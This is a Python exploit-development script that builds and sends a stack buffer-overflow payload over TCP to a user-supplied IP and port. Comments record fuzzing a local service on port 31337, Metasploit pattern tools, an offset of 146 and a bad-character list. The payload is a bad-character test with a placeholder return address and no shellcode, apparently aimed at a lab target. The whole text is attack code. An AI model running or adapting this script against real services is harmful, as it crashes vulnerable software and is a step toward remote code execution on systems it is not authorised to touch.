import socket
import sys

# [*]Fuzzing 127.0.0.1 31337 with 45302 bytes...
# root@kali:~# /usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 45300 |xclip -selection clipboard
# root@kali:~# /usr/share/metasploit-framework/tools/exploit/pattern_offset.rb -q 39654138
# [*] Exact match at offset 146
# badchars = [0x00,0x0a]

def exploit(ip,port=31337):

	badchars = [0x00,0x0a]
	char_buf = bytearray()

	for c in range(0x00,0xff+1):
		if c not in badchars:
			char_buf += (chr(c))
	
	buf = bytearray()
	buf += "a" *146
	buf += "b"*4
	buf += char_buf
	buf += "c"*(45300 - len(buf))
	buf += "\n"

	print("[*]Sending evil buf {} {} with {} bytes...".format(ip,port,len(buf)))

	s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
	s.connect((ip,port))
	s.send(buf)
	s.close()

if __name__=="__main__":
	# do magic
	
	usage = "[*]Usage: {} [ip] [port]".format(sys.argv[0])

	if len(sys.argv) != 3:
		print(usage)
		sys.exit()

	ip = sys.argv[1]
	port = sys.argv[2]

	exploit(str(ip),int(port))